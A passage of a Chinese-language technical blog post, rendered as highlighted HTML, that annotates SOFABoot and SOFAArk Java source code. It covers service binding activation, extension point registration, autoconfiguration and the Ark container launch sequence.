class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ServiceComponent</span> <span class="keyword">extends</span> <span class="title">AbstractComponent</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">resolve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        resolveBinding();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.resolve();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">resolveBinding</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Object target = service.getTarget();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (target == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ServiceRuntimeException(</span><br><span class="line">                <span class="string">"Must contains the target object whiling registering Service."</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (service.hasBinding()) &#123;</span><br><span class="line">            Set&lt;Binding&gt; bindings = service.getBindings();</span><br><span class="line">            <span class="keyword">boolean</span> allPassed = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">for</span> (Binding binding : bindings) &#123;</span><br><span class="line">                BindingAdapter&lt;Binding&gt; bindingAdapter = <span class="keyword">this</span>.bindingAdapterFactory</span><br><span class="line">                    .getBindingAdapter(binding.getBindingType());</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (bindingAdapter == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> ServiceRuntimeException(<span class="string">"Can't find BindingAdapter of type "</span></span><br><span class="line">                                                      + binding.getBindingType()</span><br><span class="line">                                                      + <span class="string">" while registering service "</span> + service</span><br><span class="line">                                                      + <span class="string">"."</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// &lt;&lt;PreOut Binding [jvm] Begins - com.alipay.sofa.isle.sample.SampleJvmService.</span></span><br><span class="line">                SofaLogger.info(<span class="string">" &lt;&lt;PreOut Binding [&#123;&#125;] Begins - &#123;&#125;."</span>, binding.getBindingType(),</span><br><span class="line">                    service);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    bindingAdapter.preOutBinding(service, binding, target, getContext());</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">                    allPassed = <span class="keyword">false</span>;</span><br><span class="line">                    SofaLogger.error(<span class="string">" &lt;&lt;PreOut Binding [&#123;&#125;] for [&#123;&#125;] occur exception."</span>,</span><br><span class="line">                        binding.getBindingType(), service, t);</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// &lt;&lt;PreOut Binding [jvm] Ends - com.alipay.sofa.isle.sample.SampleJvmService.</span></span><br><span class="line">                SofaLogger.info(<span class="string">" &lt;&lt;PreOut Binding [&#123;&#125;] Ends - &#123;&#125;."</span>, binding.getBindingType(),</span><br><span class="line">                    service);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!allPassed) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ServiceRuntimeException(<span class="string">" &lt;&lt;PreOut Binding ["</span> + service</span><br><span class="line">                                                  + <span class="string">"] occur exception."</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">activate</span><span class="params">()</span> <span class="keyword">throws</span> ServiceRuntimeException </span>&#123;</span><br><span class="line">        activateBinding();</span><br><span class="line">        <span class="keyword">super</span>.activate();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">activateBinding</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        Object target = service.getTarget();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (target == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ServiceRuntimeException(</span><br><span class="line">                <span class="string">"Must contains the target object whiling registering Service."</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (service.hasBinding()) &#123;</span><br><span class="line">            <span class="keyword">boolean</span> allPassed = <span class="keyword">true</span>;</span><br><span class="line">            Set&lt;Binding&gt; bindings = service.getBindings();</span><br><span class="line">            <span class="keyword">for</span> (Binding binding : bindings) &#123;</span><br><span class="line">                BindingAdapter&lt;Binding&gt; bindingAdapter = <span class="keyword">this</span>.bindingAdapterFactory</span><br><span class="line">                    .getBindingAdapter(binding.getBindingType());</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (bindingAdapter == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> ServiceRuntimeException(<span class="string">"Can't find BindingAdapter of type "</span></span><br><span class="line">                                                      + binding.getBindingType()</span><br><span class="line">                                                      + <span class="string">" while registering service "</span> + service</span><br><span class="line">                                                      + <span class="string">"."</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                Object outBindingResult;</span><br><span class="line">                <span class="comment">// &lt;&lt;Out Binding [jvm] Begins - com.alipay.sofa.isle.sample.SampleJvmService.</span></span><br><span class="line">                SofaLogger.info(<span class="string">" &lt;&lt;Out Binding [&#123;&#125;] Begins - &#123;&#125;."</span>, binding.getBindingType(),</span><br><span class="line">                    service);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    outBindingResult = bindingAdapter.outBinding(service, binding, target,</span><br><span class="line">                        getContext());</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">                    allPassed = <span class="keyword">false</span>;</span><br><span class="line">                    binding.setHealthy(<span class="keyword">false</span>);</span><br><span class="line">                    SofaLogger.error(<span class="string">" &lt;&lt;Out binding [&#123;&#125;] for [&#123;&#125;] occur exception."</span>,</span><br><span class="line">                        binding.getBindingType(), service, t);</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (!Boolean.FALSE.equals(outBindingResult)) &#123;</span><br><span class="line">                    <span class="comment">// &lt;&lt;Out Binding [jvm] Ends - com.alipay.sofa.isle.sample.SampleJvmService.</span></span><br><span class="line">                    SofaLogger.info(<span class="string">" &lt;&lt;Out Binding [&#123;&#125;] Ends - &#123;&#125;."</span>, binding.getBindingType(),</span><br><span class="line">                        service);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    binding.setHealthy(<span class="keyword">false</span>);</span><br><span class="line">                    SofaLogger.info(<span class="string">" &lt;&lt;Out Binding [&#123;&#125;] Fails, Don't publish service - &#123;&#125;."</span>,</span><br><span class="line">                        binding.getBindingType(), service);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!allPassed) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ServiceRuntimeException(<span class="string">" &lt;&lt;Out Binding ["</span> + service</span><br><span class="line">                                                  + <span class="string">"] occur exception."</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Register Service - com.alipay.sofa.isle.sample.SampleJvmService</span></span><br><span class="line">        SofaLogger.info(<span class="string">"Register Service - &#123;&#125;"</span>, service);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="SpringContextComponent为例"><a href="#SpringContextComponent为例" class="headerlink" title="SpringContextComponent为例"></a>SpringContextComponent为例</h5><ul><li>sofa v3.6.0才有</li><li>初始化模块的时候会调用，参考下文<a href="#并行刷新SpringContext">并行刷新SpringContext</a></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SpringContextComponent</span> <span class="keyword">extends</span> <span class="title">AbstractComponent</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 可知，只是改了状态，没做过多操作</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">activate</span><span class="params">()</span> <span class="keyword">throws</span> ServiceRuntimeException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (componentStatus != ComponentStatus.RESOLVED) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        componentStatus = ComponentStatus.ACTIVATED;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="扩展点初始化"><a href="#扩展点初始化" class="headerlink" title="扩展点初始化"></a>扩展点初始化</h3><ul><li>入口</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// AbstractExtFactoryBean =&gt; CommonContextBean -&gt; InitializingBean</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExtensionPointFactoryBean</span> <span class="keyword">extends</span> <span class="title">AbstractExtFactoryBean</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Spring会调用</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterPropertiesSet</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// targetBeanName: 扩展点所作用在的 bean 的名字</span></span><br><span class="line">        <span class="comment">// determine serviceClass (can still be null if using a FactoryBean</span></span><br><span class="line">        <span class="comment">// which doesn't declare its product type)</span></span><br><span class="line">        Class&lt;?&gt; extensionPointClass = (target != <span class="keyword">null</span> ? target.getClass() : beanFactory</span><br><span class="line">            .getType(targetBeanName));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 1.发布扩展点</span></span><br><span class="line">            publishAsNuxeoExtensionPoint(extensionPointClass);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            SofaLogger.error(e, <span class="string">"Failed to publish extension point."</span>);</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1.</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">publishAsNuxeoExtensionPoint</span><span class="params">(Class&lt;?&gt; beanClass)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Assert.notNull(beanClass, <span class="string">"Service must be implement!"</span>);</span><br><span class="line"></span><br><span class="line">        ExtensionPointBuilder extensionPointBuilder = ExtensionPointBuilder.genericExtensionPoint(</span><br><span class="line">            <span class="keyword">this</span>.name, applicationContext.getClassLoader());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">        Implementation implementation = <span class="keyword">new</span> SpringImplementationImpl(targetBeanName,</span><br><span class="line">            applicationContext);</span><br><span class="line">        ComponentInfo extensionPointComponent = <span class="keyword">new</span> ExtensionPointComponent(</span><br><span class="line">            extensionPointBuilder.getExtensionPoint(), sofaRuntimeContext, implementation);</span><br><span class="line">        <span class="comment">// 2.注册扩展到，参考 ComponentManagerImpl (类似SofaReference等注册)</span></span><br><span class="line">        sofaRuntimeContext.getComponentManager().register(extensionPointComponent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="sofa-boot-autoconfigure"><a href="#sofa-boot-autoconfigure" class="headerlink" title="sofa-boot-autoconfigure"></a>sofa-boot-autoconfigure</h2><ul><li>spring.factories</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">org.springframework.boot.autoconfigure.EnableAutoConfiguration=\</span><br><span class="line">  com.alipay.sofa.boot.autoconfigure.runtime.SofaRuntimeAutoConfiguration,\</span><br><span class="line">  com.alipay.sofa.boot.autoconfigure.isle.SofaModuleAutoConfiguration,\</span><br><span class="line">  com.alipay.sofa.boot.autoconfigure.rpc.SofaRpcAutoConfiguration,\</span><br><span class="line">  com.alipay.sofa.boot.autoconfigure.tracer.OpenTracingSpringMvcAutoConfiguration,\</span><br><span class="line">  com.alipay.sofa.boot.autoconfigure.tracer.SofaTracerAutoConfiguration,\</span><br><span class="line">  com.alipay.sofa.boot.autoconfigure.tracer.SofaTracerDataSourceAutoConfiguration,\</span><br><span class="line">  com.alipay.sofa.boot.autoconfigure.tracer.SofaTracerFeignClientAutoConfiguration,\</span><br><span class="line">  com.alipay.sofa.boot.autoconfigure.tracer.ZipkinSofaTracerAutoConfiguration,\</span><br><span class="line">  com.alipay.sofa.boot.autoconfigure.tracer.SofaTracerRestTemplateAutoConfiguration,\</span><br><span class="line">  com.alipay.sofa.boot.autoconfigure.tracer.TracerAnnotationAutoConfiguration,\</span><br><span class="line">  com.alipay.sofa.boot.autoconfigure.startup.SofaStartupAutoConfiguration,\</span><br><span class="line">  com.alipay.sofa.boot.autoconfigure.startup.SofaStartupIsleAutoConfiguration</span><br></pre></td></tr></table></figure><ul><li>SofaModuleAutoConfiguration.java</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableConfigurationProperties</span>(SofaModuleProperties.class)</span><br><span class="line"><span class="meta">@ConditionalOnClass</span>(ApplicationRuntimeModel.class)</span><br><span class="line"><span class="meta">@ConditionalOnProperty</span>(value = <span class="string">"com.alipay.sofa.boot.enable-isle"</span>, matchIfMissing = <span class="keyword">true</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SofaModuleAutoConfiguration</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 参考上文[Spring启动完成后广播事件](#Spring启动完成后广播事件)</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@ConditionalOnMissingBean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> SofaModuleContextRefreshedListener <span class="title">sofaModuleContextRefreshedListener</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> SofaModuleContextRefreshedListener();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@ConditionalOnMissingBean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ModelCreatingStage <span class="title">modelCreatingStage</span><span class="params">(ApplicationContext applicationContext)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ModelCreatingStage((AbstractApplicationContext) applicationContext);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 参考上文[SpringContextInstallStage为例](#SpringContextInstallStage为例)</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@ConditionalOnMissingBean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> SpringContextInstallStage <span class="title">springContextInstallStage</span><span class="params">(ApplicationContext applicationContext)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> SpringContextInstallStage((AbstractApplicationContext) applicationContext);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@ConditionalOnMissingBean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ModuleLogOutputStage <span class="title">moduleLogOutputStage</span><span class="params">(ApplicationContext applicationContext)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ModuleLogOutputStage((AbstractApplicationContext) applicationContext);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 实例化DefaultPipelineContext，参考上文[处理pipeline流水线](#处理pipeline流水线)</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@ConditionalOnMissingBean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> PipelineContext <span class="title">pipelineContext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> DefaultPipelineContext();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Ark容器启动流程"><a href="#Ark容器启动流程" class="headerlink" title="Ark容器启动流程"></a>Ark容器启动流程</h2><ul><li>参考：<a href="https://www.sofastack.tech/projects/sofa-boot/sofa-ark-startup/" target="_blank" rel="noopener">https://www.sofastack.tech/projects/sofa-boot/sofa-ark-startup/</a></li><li><p>流程图</p><p>  <img src="/data/images/java/sofa-ark.png" alt="sofa-ark.png"></p></li><li>SofaArk相关常量参考<code>com.alipay.sofa.ark.spi.constant.Constants</code></li></ul><h3 id="sofa-ark-support-starter"><a href="#sofa-ark-support-starter" class="headerlink" title="sofa-ark-support-starter"></a>sofa-ark-support-starter</h3><ul><li>启动Ark入口</li><li>ArkApplicationStartListener.java 监听类</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// spring.factories声明此类</span></span><br><span class="line"><span class="comment">// org.springframework.context.ApplicationListener=com.alipay.sofa.ark.springboot.listener.ArkApplicationStartListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArkApplicationStartListener</span> <span class="keyword">implements</span> <span class="title">ApplicationListener</span>&lt;<span class="title">SpringApplicationEvent</span>&gt; </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onApplicationEvent</span><span class="params">(SpringApplicationEvent event)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// springboot 2.x 启动</span></span><br><span class="line">            <span class="keyword">if</span> (isSpringBoot2()</span><br><span class="line">                &amp;&amp; APPLICATION_STARTING_EVENT.equals(event.getClass().getCanonicalName())) &#123;</span><br><span class="line">                startUpArk(event);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (isSpringBoot1()</span><br><span class="line">                &amp;&amp; APPLICATION_STARTED_EVENT.equals(event.getClass().getCanonicalName())) &#123;</span><br><span class="line">                startUpArk(event);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">"Meet exception when determine whether to start SOFAArk!"</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startUpArk</span><span class="params">(SpringApplicationEvent event)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (LAUNCH_CLASSLOADER_NAME.equals(<span class="keyword">this</span>.getClass().getClassLoader().getClass().getName())) &#123;</span><br><span class="line">            <span class="comment">// 执行 SofaArkBootstrap 启动</span></span><br><span class="line">            SofaArkBootstrap.launch(event.getArgs());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>SofaArkBootstrap.java</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SofaArkBootstrap</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String BIZ_CLASSLOADER = <span class="string">"com.alipay.sofa.ark.container.service.classloader.BizClassLoader"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String MAIN_ENTRY_NAME = <span class="string">"remain"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> EntryMethod  entryMethod;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">launch</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!isSofaArkStarted()) &#123;</span><br><span class="line">                entryMethod = <span class="keyword">new</span> EntryMethod(Thread.currentThread());</span><br><span class="line">                IsolatedThreadGroup threadGroup = <span class="keyword">new</span> IsolatedThreadGroup(</span><br><span class="line">                    entryMethod.getDeclaringClassName());</span><br><span class="line">                <span class="comment">// 下面launchThread线程会执行的任务</span></span><br><span class="line">                <span class="comment">// 传入参数：类名、方法名、参数。最终LaunchRunner#run中反射调用此方法(MAIN_ENTRY_NAME=remain)，即此类下文方法</span></span><br><span class="line">                LaunchRunner launchRunner = <span class="keyword">new</span> LaunchRunner(SofaArkBootstrap.class.getName(),</span><br><span class="line">                    MAIN_ENTRY_NAME, args);</span><br><span class="line">                Thread launchThread = <span class="keyword">new</span> Thread(threadGroup, launchRunner,</span><br><span class="line">                    entryMethod.getMethodName());</span><br><span class="line">                launchThread.start();</span><br><span class="line">                <span class="comment">// 等threadGroup执行完成时(执行launchThread的线程)，程序启动后阻塞在此处</span></span><br><span class="line">                LaunchRunner.join(threadGroup);</span><br><span class="line">                threadGroup.rethrowUncaughtException();</span><br><span class="line">                System.exit(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// LaunchRunner#run最终反射调用此方法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">remain</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;<span class="comment">// NOPMD</span></span><br><span class="line">        AssertUtils.assertNotNull(entryMethod, <span class="string">"No Entry Method Found."</span>);</span><br><span class="line">        URL[] urls = getURLClassPath();</span><br><span class="line">        <span class="comment">// 执行 ClasspathLauncher#launch。传入参数 ClassPathArchive 记录了</span></span><br><span class="line">            <span class="comment">// urls：classpath下依赖的jar</span></span><br><span class="line">            <span class="comment">// arkConfBaseDir: 配置conf/ark/bootstrap.properties文件路径</span></span><br><span class="line">        <span class="comment">// 最终反射调用ArkContainer入口：ArkContainer.main 方法，见[sofa-ark-container](#sofa-ark-container)</span></span><br><span class="line">        <span class="keyword">new</span> ClasspathLauncher(<span class="keyword">new</span> ClassPathArchive(entryMethod.getDeclaringClassName(), entryMethod.getMethodName(), urls))</span><br><span class="line">            .launch(args, getClasspath(urls), entryMethod.getMethod());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="sofa-ark-container"><a href="#sofa-ark-container" class="headerlink" title="sofa-ark-container"></a>sofa-ark-container</h3><h4 id="ArkContainer"><a href="#ArkContainer" class="headerlink" title="ArkContainer"></a>ArkContainer</h4><ul><li><strong>ArkContainer.java</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 